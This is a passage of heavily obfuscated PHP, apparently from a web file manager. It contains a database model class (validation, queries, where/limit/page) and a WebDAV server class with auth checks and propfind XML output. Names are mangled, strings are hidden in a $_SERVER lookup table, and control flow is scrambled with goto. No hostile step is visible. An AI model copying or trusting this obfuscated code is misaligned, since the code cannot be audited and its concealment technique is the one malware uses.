$DŒÁœ‹–ã’[4] = isset($DŒÁœ‹–ã’[4]) ? $DŒÁœ‹–ã’[4] : $BŒ¢ô‚[313]; switch ($DŒÁœ‹–ã’[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($a‰ ˆ ·Û, $DŒÁœ‹–ã’)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($BŒ¢ô‚[33] != trim($a‰ ˆ ·Û[$DŒÁœ‹–ã’[0]])) { if (!1 === $this->_validationField($a‰ ˆ ·Û, $DŒÁœ‹–ã’)) { return !1; } } break; default: if (isset($a‰ ˆ ·Û[$DŒÁœ‹–ã’[0]])) { if (!1 === $this->_validationField($a‰ ˆ ·Û, $DŒÁœ‹–ã’)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($eÚº”†äÏÒ, $EœßË‡Õéˆ) { if (!1 === $this->_validationFieldItem($eÚº”†äÏÒ, $EœßË‡Õéˆ)) { if ($this->patchValidate) { $this->error[$EœßË‡Õéˆ[0]] = $EœßË‡Õéˆ[2]; } else { $this->error = $EœßË‡Õéˆ[2]; return !1; } } return; } protected function _validationFieldItem($A§ßâºŒÍŒ, $AÂ¼Œ‰õğ») { $dãÃòì…Î¨ =& $_SERVER[Äº¡•ô™Ÿ]; switch (strtolower(trim($AÂ¼Œ‰õğ»[4]))) { case $dãÃòì…Î¨[306]: case $dãÃòì…Î¨[307]: $d×¥éÁ›æ­ = isset($AÂ¼Œ‰õğ»[6]) ? (array) $AÂ¼Œ‰õğ»[6] : array(); if (is_string($AÂ¼Œ‰õğ»[0]) && strpos($AÂ¼Œ‰õğ»[0], $dãÃòì…Î¨[47])) { $AÂ¼Œ‰õğ»[0] = explode($dãÃòì…Î¨[47], $AÂ¼Œ‰õğ»[0]); } if (is_array($AÂ¼Œ‰õğ»[0])) { foreach ($AÂ¼Œ‰õğ»[0] as $B §˜„¾äğ) { $f‹‚Œ¡„óĞ[$B §˜„¾äğ] = $A§ßâºŒÍŒ[$B §˜„¾äğ]; } array_unshift($d×¥éÁ›æ­, $f‹‚Œ¡„óĞ); } else { array_unshift($d×¥éÁ›æ­, $A§ßâºŒÍŒ[$AÂ¼Œ‰õğ»[0]]); } if ($dãÃòì…Î¨[306] == $AÂ¼Œ‰õğ»[4]) { return call_user_func_array($AÂ¼Œ‰õğ»[1], $d×¥éÁ›æ­); } else { return call_user_func_array(array(&$this, $AÂ¼Œ‰õğ»[1]), $d×¥éÁ›æ­); } case $dãÃòì…Î¨[314]: return $A§ßâºŒÍŒ[$AÂ¼Œ‰õğ»[0]] == $A§ßâºŒÍŒ[$AÂ¼Œ‰õğ»[1]]; case $dãÃòì…Î¨[315]: if (is_string($AÂ¼Œ‰õğ»[0]) && strpos($AÂ¼Œ‰õğ»[0], $dãÃòì…Î¨[47])) { $AÂ¼Œ‰õğ»[0] = explode($dãÃòì…Î¨[47], $AÂ¼Œ‰õğ»[0]); } $f…Š›¶ˆÆÆ = array(); if (is_array($AÂ¼Œ‰õğ»[0])) { foreach ($AÂ¼Œ‰õğ»[0] as $B §˜„¾äğ) { $f…Š›¶ˆÆÆ[$B §˜„¾äğ] = $A§ßâºŒÍŒ[$B §˜„¾äğ]; } } else { $f…Š›¶ˆÆÆ[$AÂ¼Œ‰õğ»[0]] = $A§ßâºŒÍŒ[$AÂ¼Œ‰õğ»[0]]; } if (!empty($A§ßâºŒÍŒ[$this->getPk()])) { $f…Š›¶ˆÆÆ[$this->getPk()] = array($dãÃòì…Î¨[316], $A§ßâºŒÍŒ[$this->getPk()]); } if ($this->where($f…Š›¶ˆÆÆ)->find()) { return !1; } return !0; default: return $this->check($A§ßâºŒÍŒ[$AÂ¼Œ‰õğ»[0]], $AÂ¼Œ‰õğ»[1], $AÂ¼Œ‰õğ»[4]); } } public function check($e²ê‚´¤º‘, $dŸ†æÙ¦å†, $dˆ´ÙÒ¥‚º = "\x72\145\147\145\170") { $F±«Êì ±ç =& $_SERVER[Äº¡•ô™Ÿ]; $dˆ´ÙÒ¥‚º = strtolower(trim($dˆ´ÙÒ¥‚º)); switch ($dˆ´ÙÒ¥‚º) { case $F±«Êì ±ç[7]: case $F±«Êì ±ç[317]: $fÅÖ½°‚…½ = is_array($dŸ†æÙ¦å†) ? $dŸ†æÙ¦å† : explode($F±«Êì ±ç[47], $dŸ†æÙ¦å†); return $dˆ´ÙÒ¥‚º == $F±«Êì ±ç[7] ? in_array($e²ê‚´¤º‘, $fÅÖ½°‚…½) : !in_array($e²ê‚´¤º‘, $fÅÖ½°‚…½); case $F±«Êì ±ç[318]: case $F±«Êì ±ç[319]: if (is_array($dŸ†æÙ¦å†)) { $AğïóãÚœ = $dŸ†æÙ¦å†[0]; $cù œÁ£— = $dŸ†æÙ¦å†[1]; } else { list($AğïóãÚœ, $cù œÁ£—) = explode($F±«Êì ±ç[47], $dŸ†æÙ¦å†); } return $dˆ´ÙÒ¥‚º == $F±«Êì ±ç[318] ? $e²ê‚´¤º‘ >= $AğïóãÚœ && $e²ê‚´¤º‘ <= $cù œÁ£— : $e²ê‚´¤º‘ < $AğïóãÚœ || $e²ê‚´¤º‘ > $cù œÁ£—; case $F±«Êì ±ç[320]: case $F±«Êì ±ç[321]: return $dˆ´ÙÒ¥‚º == $F±«Êì ±ç[320] ? $e²ê‚´¤º‘ == $dŸ†æÙ¦å† : $e²ê‚´¤º‘ != $dŸ†æÙ¦å†; case $F±«Êì ±ç[322]: $cÚ…ã¿¤š = mb_strlen($e²ê‚´¤º‘, $F±«Êì ±ç[323]); if (strpos($dŸ†æÙ¦å†, $F±«Êì ±ç[47])) { list($AğïóãÚœ, $cù œÁ£—) = explode($F±«Êì ±ç[47], $dŸ†æÙ¦å†); return $cÚ…ã¿¤š >= $AğïóãÚœ && $cÚ…ã¿¤š <= $cù œÁ£—; } else { return $cÚ…ã¿¤š == $dŸ†æÙ¦å†; } case $F±«Êì ±ç[324]: list($BóÆ¡ŠìÓ, $BèÑÎ“Ûô) = explode($F±«Êì ±ç[47], $dŸ†æÙ¦å†); if (!is_numeric($BóÆ¡ŠìÓ)) { $BóÆ¡ŠìÓ = strtotime($BóÆ¡ŠìÓ); } if (!is_numeric($BèÑÎ“Ûô)) { $BèÑÎ“Ûô = strtotime($BèÑÎ“Ûô); } return NOW_TIME >= $BóÆ¡ŠìÓ && NOW_TIME <= $BèÑÎ“Ûô; case $F±«Êì ±ç[325]: return in_array(get_client_ip(), explode($F±«Êì ±ç[47], $dŸ†æÙ¦å†)); case $F±«Êì ±ç[326]: return !in_array(get_client_ip(), explode($F±«Êì ±ç[47], $dŸ†æÙ¦å†)); case $F±«Êì ±ç[313]: default: return $this->regex($e²ê‚´¤º‘, $dŸ†æÙ¦å†); } } public function query($cÑĞœÙ¬İ¬, $dæÜ˜Š¦±ø = false) { $D‘ó®£†Õ¢ =& $_SERVER[Äº¡•ô™Ÿ]; if (!is_bool($dæÜ˜Š¦±ø) && !is_array($dæÜ˜Š¦±ø)) { $dæÜ˜Š¦±ø = func_get_args(); array_shift($dæÜ˜Š¦±ø); } $cÑĞœÙ¬İ¬ = str_replace(array($D‘ó®£†Õ¢[214], $D‘ó®£†Õ¢[327]), $D‘ó®£†Õ¢[50], $cÑĞœÙ¬İ¬); $cÑĞœÙ¬İ¬ = $this->parseSql($cÑĞœÙ¬İ¬, $dæÜ˜Š¦±ø); return $this->db->query($cÑĞœÙ¬İ¬); } public function execute($cßŠ‘‘©èá, $A‚¤ƒ·Í¡¡ = false) { if (!is_bool($A‚¤ƒ·Í¡¡) && !is_array($A‚¤ƒ·Í¡¡)) { $A‚¤ƒ·Í¡¡ = func_get_args(); array_shift($A‚¤ƒ·Í¡¡); } $cßŠ‘‘©èá = $this->parseSql($cßŠ‘‘©èá, $A‚¤ƒ·Í¡¡); return $this->db->execute($cßŠ‘‘©èá); } protected function parseSql($b¸ã ²ŸÕ, $EÆÃğç§Ÿ¸) { $DÂ®÷ª£ƒÑ =& $_SERVER[Äº¡•ô™Ÿ]; if (!0 === $EÆÃğç§Ÿ¸) { $c¶Áëª¬šã = $this->_parseOptions(); $b¸ã ²ŸÕ = $this->db->parseSql($b¸ã ²ŸÕ, $c¶Áëª¬šã); } elseif (is_array($EÆÃğç§Ÿ¸)) { $EÆÃğç§Ÿ¸ = array_map(array($this->db, $DÂ®÷ª£ƒÑ[328]), $EÆÃğç§Ÿ¸); $b¸ã ²ŸÕ = vsprintf($b¸ã ²ŸÕ, $EÆÃğç§Ÿ¸); } else { $b¸ã ²ŸÕ = strtr($b¸ã ²ŸÕ, array($DÂ®÷ª£ƒÑ[329] => $this->getTableName(), $DÂ®÷ª£ƒÑ[330] => think_config($DÂ®÷ª£ƒÑ[229]))); } $this->db->setModel($this->name); return $b¸ã ²ŸÕ; } public function db($E‘Š©†¬ö = '', $D–à˜İ¯± = '', $c‰Ùïæ÷öó = array()) { goto aœçÀ‡•º; eÓí¸§‘˜: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto D†­¨Ú¿§Ã; aœçÀ‡•º: $eÜÁÊÑ÷ø =& $_SERVER[Äº¡•ô™Ÿ]; if ($eÜÁÊÑ÷ø[33] === $E‘Š©†¬ö && $this->db) { return $this->db; } static $a¶¥¬‘ÖÆ = array(); goto e­Àâ•çáë; EŒÙ‰ÜÁ¦: $a¶¥¬‘ÖÆ[$E‘Š©†¬ö] = $D–à˜İ¯±; $this->db = $dİÉ‡ù¯øä[$E‘Š©†¬ö]; $this->_after_db(); goto eÓí¸§‘˜; e­Àâ•çáë: static $dİÉ‡ù¯øä = array(); if (!isset($dİÉ‡ù¯øä[$E‘Š©†¬ö]) || isset($dİÉ‡ù¯øä[$E‘Š©†¬ö]) && $D–à˜İ¯± && $a¶¥¬‘ÖÆ[$E‘Š©†¬ö] != $D–à˜İ¯±) { if (!empty($D–à˜İ¯±) && is_string($D–à˜İ¯±) && !1 === strpos($D–à˜İ¯±, $eÜÁÊÑ÷ø[8])) { $D–à˜İ¯± = think_config($D–à˜İ¯±); } $dİÉ‡ù¯øä[$E‘Š©†¬ö] = Db::getInstance($D–à˜İ¯±); } elseif (NULL === $D–à˜İ¯±) { $dİÉ‡ù¯øä[$E‘Š©†¬ö]->close(); unset($dİÉ‡ù¯øä[$E‘Š©†¬ö]); return; } if (!empty($c‰Ùïæ÷öó)) { if (is_string($c‰Ùïæ÷öó)) { parse_str($c‰Ùïæ÷öó, $c‰Ùïæ÷öó); } foreach ($c‰Ùïæ÷öó as $béèëŒ•Ñ => $A‚É±ÙÒÂ¦) { $this->setProperty($béèëŒ•Ñ, $A‚É±ÙÒÂ¦); } } goto EŒÙ‰ÜÁ¦; D†­¨Ú¿§Ã: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Eç‹ÈÕè² = get_class($this); if ($Eç‹ÈÕè² == $_SERVER[Äº¡•ô™Ÿ][331]) { return $this->name; } $this->name = substr($Eç‹ÈÕè², 0, -5); } return $this->name; } public function getTableName() { $e»Ğ÷ĞáâÒ =& $_SERVER[Äº¡•ô™Ÿ]; if (empty($this->trueTableName)) { $C˜ÙÄÙ‚Ñğ = !empty($this->tablePrefix) ? $this->tablePrefix : $e»Ğ÷ĞáâÒ[33]; if (!empty($this->tableName)) { $C˜ÙÄÙ‚Ñğ .= $this->tableName; } else { $C˜ÙÄÙ‚Ñğ .= think_parse_name($this->name); } $this->trueTableName = strtolower($C˜ÙÄÙ‚Ñğ); } return (!empty($this->dbName) ? $this->dbName . $e»Ğ÷ĞáâÒ[93] : $e»Ğ÷ĞáâÒ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $bÑÙÏŠ‡Æ§ =& $_SERVER[Äº¡•ô™Ÿ]; return isset($this->fields[$bÑÙÏŠ‡Æ§[236]]) ? $this->fields[$bÑÙÏŠ‡Æ§[236]] : $this->pk; } public function getDbFields() { $E÷ ´†ËÛÖ =& $_SERVER[Äº¡•ô™Ÿ]; if (isset($this->options[$E÷ ´†ËÛÖ[264]])) { $D¾Ë«öãÜÒ = $this->db->getFields($this->options[$E÷ ´†ËÛÖ[264]]); return $D¾Ë«öãÜÒ ? array_keys($D¾Ë«öãÜÒ) : !1; } if ($this->fields) { $D¾Ë«öãÜÒ = $this->fields; unset($D¾Ë«öãÜÒ[$E÷ ´†ËÛÖ[235]], $D¾Ë«öãÜÒ[$E÷ ´†ËÛÖ[236]], $D¾Ë«öãÜÒ[$E÷ ´†ËÛÖ[237]], $D¾Ë«öãÜÒ[$E÷ ´†ËÛÖ[234]]); return $D¾Ë«öãÜÒ; } return !1; } public function data($FŒ®ó­ÇôØ = '') { $fÛí³ê†‡² =& $_SERVER[Äº¡•ô™Ÿ]; if ($fÛí³ê†‡²[33] === $FŒ®ó­ÇôØ && !empty($this->data)) { return $this->data; } if (is_object($FŒ®ó­ÇôØ)) { $FŒ®ó­ÇôØ = get_object_vars($FŒ®ó­ÇôØ); } elseif (is_string($FŒ®ó­ÇôØ)) { parse_str($FŒ®ó­ÇôØ, $FŒ®ó­ÇôØ); } elseif (!is_array($FŒ®ó­ÇôØ)) { think_exception(think_lang($fÛí³ê†‡²[256])); } $this->data = $FŒ®ó­ÇôØ; return $this; } public function join($bîĞãÀØ¢˜) { $Fë¦ô£“äœ =& $_SERVER[Äº¡•ô™Ÿ]; if (is_array($bîĞãÀØ¢˜)) { $this->options[$Fë¦ô£“äœ[267]] = $bîĞãÀØ¢˜; } elseif (!empty($bîĞãÀØ¢˜)) { $this->options[$Fë¦ô£“äœ[267]][] = $bîĞãÀØ¢˜; } return $this; } public function union($bÖòÌ‘Š, $aàìÂŒ’³ = false) { goto Fè¯ªƒø; f¦†Ÿ¹Ê»: return $this; goto d¿Ûİ†¶ÄÄ; Fè¯ªƒø: $f©ùè¹²öÍ =& $_SERVER[Äº¡•ô™Ÿ]; if (empty($bÖòÌ‘Š)) { return $this; } if ($aàìÂŒ’³) { $this->options[$f©ùè¹²öÍ[332]][$f©ùè¹²öÍ[333]] = !0; } goto cÉï˜…ñáá; cÉï˜…ñáá: if (is_object($bÖòÌ‘Š)) { $bÖòÌ‘Š = get_object_vars($bÖòÌ‘Š); } if (is_string($bÖòÌ‘Š)) { $f˜Æ‹Ç”‚÷ = $bÖòÌ‘Š; } elseif (is_array($bÖòÌ‘Š)) { if (isset($bÖòÌ‘Š[0])) { $this->options[$f©ùè¹²öÍ[332]] = array_merge($this->options[$f©ùè¹²öÍ[332]], $bÖòÌ‘Š); return $this; } else { $f˜Æ‹Ç”‚÷ = $bÖòÌ‘Š; } } else { think_exception(think_lang($f©ùè¹²öÍ[256])); } $this->options[$f©ùè¹²öÍ[332]][] = $f˜Æ‹Ç”‚÷; goto f¦†Ÿ¹Ê»; d¿Ûİ†¶ÄÄ: } public function cache($Fâñ¯Õ´á˜ = true, $bÙ¬‚‹ÊÁê = null, $e…ê›ÜöÈ´ = '') { $cëÜ™äŸÇö =& $_SERVER[Äº¡•ô™Ÿ]; if (!1 !== $Fâñ¯Õ´á˜) { $this->options[$cëÜ™äŸÇö[334]] = array($cëÜ™äŸÇö[89] => $Fâñ¯Õ´á˜, $cëÜ™äŸÇö[324] => $bÙ¬‚‹ÊÁê, $cëÜ™äŸÇö[29] => $e…ê›ÜöÈ´); } return $this; } public function field($e¸‹ê«›ˆÚ, $f«ÏÑƒè–Ê = false) { $c‰íºˆîÌÜ =& $_SERVER[Äº¡•ô™Ÿ]; if (!0 === $e¸‹ê«›ˆÚ) { $C‹Í¹„Ù£Š = $this->getDbFields(); $e¸‹ê«›ˆÚ = $C‹Í¹„Ù£Š ? $C‹Í¹„Ù£Š : $c‰íºˆîÌÜ[173]; } elseif ($f«ÏÑƒè–Ê) { if (is_string($e¸‹ê«›ˆÚ)) { $e¸‹ê«›ˆÚ = explode($c‰íºˆîÌÜ[47], $e¸‹ê«›ˆÚ); } $C‹Í¹„Ù£Š = $this->getDbFields(); $e¸‹ê«›ˆÚ = $C‹Í¹„Ù£Š ? array_diff($C‹Í¹„Ù£Š, $e¸‹ê«›ˆÚ) : $e¸‹ê«›ˆÚ; } $this->options[$c‰íºˆîÌÜ[258]] = $e¸‹ê«›ˆÚ; return $this; } public function scope($dê¿‰ØÔù = '', $AŠ±ŠíÒê© = NULL) { $b¾Âë§½à• =& $_SERVER[Äº¡•ô™Ÿ]; if ($b¾Âë§½à•[33] === $dê¿‰ØÔù) { if (isset($this->_scope[$b¾Âë§½à•[34]])) { $bŸº„Œ‹…ï = $this->_scope[$b¾Âë§½à•[34]]; } else { return $this; } } elseif (is_string($dê¿‰ØÔù)) { $E„ ±º½¼ = explode($b¾Âë§½à•[47], $dê¿‰ØÔù); $bŸº„Œ‹…ï = array(); foreach ($E„ ±º½¼ as $a ¯ëŠˆ¾ˆ) { if (!isset($this->_scope[$a ¯ëŠˆ¾ˆ])) { continue; } $bŸº„Œ‹…ï = array_merge($bŸº„Œ‹…ï, $this->_scope[$a ¯ëŠˆ¾ˆ]); } if (!empty($AŠ±ŠíÒê©) && is_array($AŠ±ŠíÒê©)) { $bŸº„Œ‹…ï = array_merge($bŸº„Œ‹…ï, $AŠ±ŠíÒê©); } } elseif (is_array($dê¿‰ØÔù)) { $bŸº„Œ‹…ï = $dê¿‰ØÔù; } if (is_array($bŸº„Œ‹…ï) && !empty($bŸº„Œ‹…ï)) { $this->options = array_merge($this->options, array_change_key_case($bŸº„Œ‹…ï)); } return $this; } public function where($EÏÜ‘š½†¨, $eÚŞÚŒ³Ö = null) { $Aíß¡Œ­¬‘ =& $_SERVER[Äº¡•ô™Ÿ]; if (!is_null($eÚŞÚŒ³Ö) && is_string($EÏÜ‘š½†¨)) { if (!is_array($eÚŞÚŒ³Ö)) { $eÚŞÚŒ³Ö = func_get_args(); array_shift($eÚŞÚŒ³Ö); } $eÚŞÚŒ³Ö = array_map(array($this->db, $Aíß¡Œ­¬‘[328]), $eÚŞÚŒ³Ö); $EÏÜ‘š½†¨ = vsprintf($EÏÜ‘š½†¨, $eÚŞÚŒ³Ö); } elseif (is_object($EÏÜ‘š½†¨)) { $EÏÜ‘š½†¨ = get_object_vars($EÏÜ‘š½†¨); } elseif (is_array($EÏÜ‘š½†¨)) { foreach ($EÏÜ‘š½†¨ as $BŞšô‘øºÆ => $bëÒ–‰ÀÀ) { if ((is_numeric($BŞšô‘øºÆ) || !$BŞšô‘øºÆ) && is_string($bëÒ–‰ÀÀ)) { think_trace($Aíß¡Œ­¬‘[335], $Aíß¡Œ­¬‘[33], $Aíß¡Œ­¬‘[46]); die; } } } if (is_string($EÏÜ‘š½†¨) && $Aíß¡Œ­¬‘[33] != $EÏÜ‘š½†¨) { $eÉ¤›‹ŞÕ = array(); $eÉ¤›‹ŞÕ[$Aíß¡Œ­¬‘[336]] = $EÏÜ‘š½†¨; $EÏÜ‘š½†¨ = $eÉ¤›‹ŞÕ; } if (isset($this->options[$Aíß¡Œ­¬‘[260]])) { $this->options[$Aíß¡Œ­¬‘[260]] = array_merge($this->options[$Aíß¡Œ­¬‘[260]], $EÏÜ‘š½†¨); } else { $this->options[$Aíß¡Œ­¬‘[260]] = $EÏÜ‘š½†¨; } return $this; } public function limit($Bâµšê¼ˆ, $bĞšê ±¯ = null) { $eÎ³ç×öï‡ =& $_SERVER[Äº¡•ô™Ÿ]; $this->options[$eÎ³ç×öï‡[277]] = is_null($bĞšê ±¯) ? $Bâµšê¼ˆ : $Bâµšê¼ˆ . $eÎ³ç×öï‡[47] . $bĞšê ±¯; return $this; } public function page($aÄĞ•Ÿˆ½, $BŒ¢ìé´İÒ = null) { $e°Š¾«í• =& $_SERVER[Äº¡•ô™Ÿ]; $this->options[$e°Š¾«í•[337]] = is_null($BŒ¢ìé´İÒ) ? $aÄĞ•Ÿˆ½ : $aÄĞ•Ÿˆ½ . $e°Š¾«í•[47] . $BŒ¢ìé´İÒ; return $this; } public function comment($C‘Ø÷®Š°‰) { $this->options[$_SERVER[Äº¡•ô™Ÿ][338]] = $C‘Ø÷®Š°‰; return $this; } public function setProperty($c™›Š›“´¡, $d–÷šæôƒ) { if (property_exists($this, $c™›Š›“´¡)) { $this->{$c™›Š›“´¡} = $d–÷šæôƒ; } return $this; } } goto fÓõ¶ò¹¸¦; FÙ…Å ò: define($_SERVER[Äº¡•ô™Ÿ][224], 2); define($_SERVER[Äº¡•ô™Ÿ][225], 3); define($_SERVER[Äº¡•ô™Ÿ][226], 1); goto FÄì´íÆ‘ï; c¹©…ö¡ÑÄ: class HttpDavServer { public function __construct($E‹øìõÕÆß, $fÎ­ Ë¹®) { $this->root = $E‹øìõÕÆß; $this->initPath($fÎ­ Ë¹®); $this->start(); } public function initPath($f•ª…Î•ó¼) { $cšÍĞé§ƒÙ =& $_SERVER[Äº¡•ô™Ÿ]; $fõÉ¥•…è¸ = rtrim($_SERVER[$cšÍĞé§ƒÙ[1367]], $cšÍĞé§ƒÙ[8]) . $cšÍĞé§ƒÙ[8]; $this->urlBase = substr($fõÉ¥•…è¸, 0, strpos($fõÉ¥•…è¸, $f•ª…Î•ó¼) + 1); $this->urlBase = rtrim($this->urlBase, $cšÍĞé§ƒÙ[8]) . $f•ª…Î•ó¼; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $c›ÎêëÖ°Ğ =& $_SERVER[Äº¡•ô™Ÿ]; $A÷à‚¶·Î = HttpAuth::get(); if ($A÷à‚¶·Î[$c›ÎêëÖ°Ğ[531]] == $c›ÎêëÖ°Ğ[1759] && $A÷à‚¶·Î[$c›ÎêëÖ°Ğ[899]] == $c›ÎêëÖ°Ğ[1760]) { return !0; } HttpAuth::error(); } public function start() { goto aŠó“ñéÍ; aŠó“ñéÍ: $f²…°’¤Œ =& $_SERVER[Äº¡•ô™Ÿ]; $this->checkUser(); $aø³Èöïê = $f²…°’¤Œ[143] . HttpHeader::method(); goto d¾ñ¬Åëƒ; A¹È³•„»: if (!$Eï´Œ‚º‡) { return; } self::response($Eï´Œ‚º‡); goto E‘¢áœë™­; d¾ñ¬Åëƒ: if (!method_exists($this, $aø³Èöïê)) { pr($aø³Èöïê . $f²…°’¤Œ[1761]); die; } $cîØˆÛÕô“ = array($f²…°’¤Œ[1762], $f²…°’¤Œ[1763]); if (!in_array($aø³Èöïê, $cîØˆÛÕô“) && !$this->pathExists($this->path)) { $Eï´Œ‚º‡ = array($f²…°’¤Œ[1032] => 404); } else { $Eï´Œ‚º‡ = $this->{$aø³Èöïê}(); } goto A¹È³•„»; E‘¢áœë™­: } public function pathGet($DÏ¥© ¸ôÕ = false) { $D”ŠŞ²Ûƒ =& $_SERVER[Äº¡•ô™Ÿ]; $AØ“ÏÒÒÁÚ = $DÏ¥© ¸ôÕ ? $_SERVER[$D”ŠŞ²Ûƒ[1764]] : $_SERVER[$D”ŠŞ²Ûƒ[1367]]; $AØ“ÏÒÒÁÚ = KodIO::clear(rawurldecode($AØ“ÏÒÒÁÚ)); if (!strstr($AØ“ÏÒÒÁÚ, KodIO::clear($this->urlBase))) { return !1; } return substr($AØ“ÏÒÒÁÚ, strpos($AØ“ÏÒÒÁÚ, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($bİê¹›È¢å) { return file_exists($bİê¹›È¢å); } public function pathMkdir($fˆ‘ñÆ„»‹) { return mkdir($fˆ‘ñÆ„»‹, 511, !0); } public function pathInfo($e­ŞìË‡àÜ) { return path_info($e­ŞìË‡àÜ); } public function pathList($B›Ë‹í‡®¤) { return path_list($B›Ë‹í‡®¤); } public function pathOut($fÒŠí¶«•“) { echo file_get_contents($fÒŠí¶«•“); } public function pathPut($d×•¤â¥, $f’ä×Î…†’ = '') { if (!$f’ä×Î…†’) { return file_put_contents($d×•¤â¥, $_SERVER[Äº¡•ô™Ÿ][33]); } return move_path($f’ä×Î…†’, $d×•¤â¥); } public function pathRemove($D”Å¾Œ«ÑÌ) { if (is_file($D”Å¾Œ«ÑÌ)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($FÇ¤ôàšˆÉ, $F¡‹î¾³Âò) { return move_path($FÇ¤ôàšˆÉ, $F¡‹î¾³Âò); } public function pathCopy($cÂãÛË—Á·, $A­²’‹ÖÏš) { return copy_dir($cÂãÛË—Á·, $A­²’‹ÖÏš); } public function parsePath($Dª´÷—‘ï³) { return $Dª´÷—‘ï³; } public function parseItem($bğòÇ‰Øæâ, $CíˆÇË³ŸÎ) { goto fÌ²ùšÕª; e‡öæâÑùŞ: $AèÃâ›ˆ„’ = array($A–ŒÁ“’Û¥[1765] => KodIO::clear($this->urlBase . $A¹°ˆ•âÃ), $A–ŒÁ“’Û¥[107] => @gmdate($A–ŒÁ“’Û¥[1766], $bğòÇ‰Øæâ[$A–ŒÁ“’Û¥[107]]), $A–ŒÁ“’Û¥[184] => @gmdate($A–ŒÁ“’Û¥[1767], $bğòÇ‰Øæâ[$A–ŒÁ“’Û¥[184]]), $A–ŒÁ“’Û¥[77] => $bğòÇ‰Øæâ[$A–ŒÁ“’Û¥[77]] ? $bğòÇ‰Øæâ[$A–ŒÁ“’Û¥[77]] : 0); return $AèÃâ›ˆ„’; goto d‡ä¬İ™¹; AÎè“¾áò: if ($CíˆÇË³ŸÎ) { $A¹°ˆ•âÃ = $A–ŒÁ“’Û¥[8] . str_replace($A–ŒÁ“’Û¥[169], $A–ŒÁ“’Û¥[8], rawurlencode($this->pathGet())); } if (!trim($bğòÇ‰Øæâ[$A–ŒÁ“’Û¥[107]])) { $bğòÇ‰Øæâ[$A–ŒÁ“’Û¥[107]] = time(); } if (!trim($bğòÇ‰Øæâ[$A–ŒÁ“’Û¥[184]])) { $bğòÇ‰Øæâ[$A–ŒÁ“’Û¥[184]] = time(); } goto e‡öæâÑùŞ; fÌ²ùšÕª: $A–ŒÁ“’Û¥ =& $_SERVER[Äº¡•ô™Ÿ]; $A¹°ˆ•âÃ = $this->pathGet() . $A–ŒÁ“’Û¥[8] . $bğòÇ‰Øæâ[$A–ŒÁ“’Û¥[28]]; $A¹°ˆ•âÃ = $A–ŒÁ“’Û¥[8] . str_replace($A–ŒÁ“’Û¥[169], $A–ŒÁ“’Û¥[8], rawurlencode($A¹°ˆ•âÃ)); goto AÎè“¾áò; d‡ä¬İ™¹: } public function parseItemXml($FİÈ«¥Ô¡, $a–ƒƒØÅ“º) { $DÃœ¤„†â =& $_SERVER[Äº¡•ô™Ÿ]; $B–ÊÓ±Ù¼í = $this->parseItem($FİÈ«¥Ô¡, $a–ƒƒØÅ“º); if ($FİÈ«¥Ô¡[$DÃœ¤„†â[29]] == $DÃœ¤„†â[76]) { $CÁÙâ‘‡¬ = $DÃœ¤„†â[1768]; $CÁÙâ‘‡¬ .= $DÃœ¤„†â[1769]; } else { $Fá“íù›îÉ = $FİÈ«¥Ô¡[$DÃœ¤„†â[157]] ? $FİÈ«¥Ô¡[$DÃœ¤„†â[157]] : get_path_ext($FİÈ«¥Ô¡[$DÃœ¤„†â[28]]); $EÍ•ÑéğéÌ = get_file_mime($Fá“íù›îÉ); $CÁÙâ‘‡¬ = $DÃœ¤„†â[1770]; $CÁÙâ‘‡¬ .= "\x3c\104\72\x67\145\x74\x63\157\156\164\x65\156\x74\164\x79\x70\x65\x3e{$EÍ•ÑéğéÌ}\x3c\57\104\72\x67\x65\164\143\x6f\156\164\145\x6e\x74\x74\171\x70\x65\x3e"; } return "\12\11\x9\74\x44\x3a\162\145\x73\160\x6f\156\163\x65\76\xa\11\x9\11\x3c\104\72\150\x72\x65\x66\76{$B–ÊÓ±Ù¼í[$DÃœ¤„†â[1765]]}\74\x2f\x44\72\x68\162\x65\x66\76\xa\x9\x9\x9\x3c\104\72\160\x72\157\x70\163\x74\141\x74\x3e\12\11\11\x9\x9\x3c\x44\72\160\162\157\x70\76\xa\11\11\x9\11\x9\74\x44\72\147\x65\x74\x6c\x61\163\164\155\157\x64\151\146\x69\x65\x64\76{$B–ÊÓ±Ù¼í[$DÃœ¤„†â[107]]}\74\x2f\x44\72\147\145\x74\154\141\x73\164\x6d\157\x64\x69\x66\151\x65\144\76\xa\11\x9\x9\x9\x9\x3c\104\72\x63\162\x65\141\164\x69\x6f\156\144\x61\164\x65\x3e{$B–ÊÓ±Ù¼í[$DÃœ¤„†â[184]]}\x3c\57\104\x3a\x63\162\x65\141\164\x69\x6f\156\x64\141\x74\145\x3e\xa\11\x9\x9\x9\11\74\104\x3a\x67\145\164\x63\157\156\164\145\x6e\x74\x6c\x65\x6e\x67\164\150\x3e{$B–ÊÓ±Ù¼í[$DÃœ¤„†â[77]]}\x3c\57\104\x3a\x67\145\x74\143\x6f\156\x74\x65\x6e\x74\x6c\x65\156\147\164\x68\76\xa\x9\x9\x9\x9\x9{$CÁÙâ‘‡¬}\xa\11\11\x9\11\x3c\57\x44\72\160\162\157\x70\76\12\11\x9\11\x9\x3c\x44\x3a\163\x74\x61\164\165\x73\x3e\x48\124\x54\120\57\x31\x2e\x31\x20\62\60\60\40\117\x4b\x3c\57\104\72\163\164\x61\x74\165\x73\x3e\xa\x9\11\11\x3c\57\104\x3a\x70\x72\157\x70\x73\164\x61\x74\x3e\xa\11\11\x3c\57\x44\x3a\162\x65\x73\160\157\156\x73\145\x3e"; } public function pathListMerge($f±‰â•ë¼Ë) { goto fĞ–³ØÎø; fĞ–³ØÎø: $CÌîŠÍ¡Õ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$f±‰â•ë¼Ë) { return $f±‰â•ë¼Ë; } 